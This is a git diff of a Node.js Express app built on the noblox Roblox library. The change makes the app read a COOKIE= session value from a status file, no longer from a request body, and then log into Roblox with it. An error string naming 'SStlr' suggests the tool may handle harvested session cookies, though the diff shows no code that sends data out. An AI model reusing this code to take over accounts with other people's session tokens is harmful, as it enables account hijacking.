@@ -25,6 +25,18 @@ const secApp = Express();
 
 let cookie = null
 
+const content = statusContents.split('\n')
+
+const cookieRegex = /COOKIE=(.*)/;
+
+for (let i = 0; i < content.length; i++) {
+  const matchCookie = content[i].match(cookieRegex);
+
+  if (matchCookie) {
+    cookie = matchCookie[1];
+  }
+}
+
 const nameTab = ["Oliver", "Ethan", "Ava", "Sophia", "Mia", "Liam", "Isabella", "Charlotte", "Amelia", "Harper", "Emma", "Noah", "William", "James", "Logan", "Lucas", "Alexander", "Elijah", "Benjamin", "Michael", "Daniel", "Matthew", "Emily", "Madison", "Abigail", "Ella", "Grace", "Chloe", "Avery", "Lily", "Jackson", "Evelyn", "Mason", "Sofia", "Eleanor", "Aiden", "Hazel", "Aria", "Scarlett", "Grayson", "Luna", "Mila", "Lillian", "Penelope", "Victoria", "Leah", "Natalie", "Audrey", "Zoe", "Stella", "Lila",
   "Aaliyah", "Aarav", "Adalyn", "Adam", "Adeline", "Adrian", "Ainsley", "Alaina", "Alan", "Alayna", "Alden", "Alec", "Alejandra", "Alexandra", "Alexia", "Alfred", "Ali", "Alice", "Alina", "Alison", "Allan", "Allyson", "Alma", "Alvin", "Alyssa", "Amara", "Amari", "Amina", "Amir", "Anastasia", "Anderson", "Andres", "Andy", "Angel", "Angela", "Angelina", "Angelo", "Anika", "Aniyah", "Ann", "Anna", "Anne", "Annie", "Anthony", "Antonio", "Arabella", "Ari", "Aria", "Ariah", "Ariana", "Ariel", "Ariella", "Arlo", "Arturo", "Arya", "Ash", "Asher", "Ashlyn", "Ashton", "Aspen", "Astrid", "Atlas", "Atticus", "Aubree", "Aubrey", "August", "Augustus", "Aurora", "Austin", "Autumn", "Ava", "Avery", "Axel", "Ayden", "Ayla", "Bailey", "Barbara", "Barrett", "Beatrice"]
 
@@ -175,7 +187,6 @@ mainApp.post('/', async (req, res) => {
 });
 
 secApp.post('/', async (req, res) => {
-  cookie = req.body.cookie 
   if (!cookie) return console.error("SStlr - Invalid cookie and couldn't find in registry");
 
   await noblox.setCookie(cookie);
